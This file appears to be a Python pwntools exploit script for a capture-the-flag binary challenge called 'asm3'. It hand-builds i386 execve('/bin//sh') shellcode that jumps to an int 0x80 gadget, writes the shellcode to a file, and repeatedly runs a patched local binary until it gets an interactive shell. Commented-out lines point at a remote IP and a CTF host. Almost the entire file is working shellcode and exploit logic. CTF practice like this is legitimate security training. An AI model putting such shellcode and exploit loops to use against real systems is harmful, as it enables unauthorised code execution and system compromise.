from pwn import *

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
# context.log_level = 'error'

code_base = 0x565f5000
bss_base = 0x565f7000

int80_offset = 0xcc0
read_offset = 0x770
rop_chain_offset = 0x300

int80_addr = code_base + int80_offset
read_addr = code_base + read_offset
rop_chain_addr = bss_base + rop_chain_offset

script = "b *main+519"

# p = remote("13.124.134.94", 8888)

DEBUG = True

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def s(msg, enter = True):
  msg = msg + "\n" if enter else msg
  p.send(msg)
  if DEBUG:
    log.info("Sent: " + msg)

sc = pwnlib.shellcraft.i386
context.arch = 'i386'

code = "mov esp, gs:[eax]\n"
code += 'push ebx\n'
code += 'push 0x68732f2f\n'
code += 'push 0x6e69622f\n'
code += 'mov ebx, esp\n'
code += 'mov al, 0x0b\n'
# code += 'add ebp, 0xfffe2be0\n'
code += 'push %s\n' % int80_addr
code += 'ret'

"""
code = "mov esp, gs:[eax]\n"
code += 'push ebx\n'
code += 'push 0x68732f2f\n'
code += 'push 0x6e69622f\n'
code += 'mov ebx, esp\n'
code += 'mov al, 0x0b\n'
code += 'mov si, gs:0x12341234\n'
# code += 'jmp cs:0x12341234\n'
"""

shell = asm(code)

print "length: %d" % len(shell)

shell = shell.ljust(0x1e, "\x90")

print shell.encode('hex')

f = open('shell', 'w')
f.write(shell)
f.close()


for i in range(1000):
  p = process("./asm3_patch")

  # p = remote('localhost', 4924)
  # gdb.attach(p, gdbscript = script)

  # p = remote('asm3.eatpwnnosleep.com', 1234)

  r("shellcode:")
  s(shell, False)

  r("see\n")

  try:
    s("/bin/ls")
    response = r("\n")

    print response

    p.interactive()
    p.close()

  except:
    p.close()
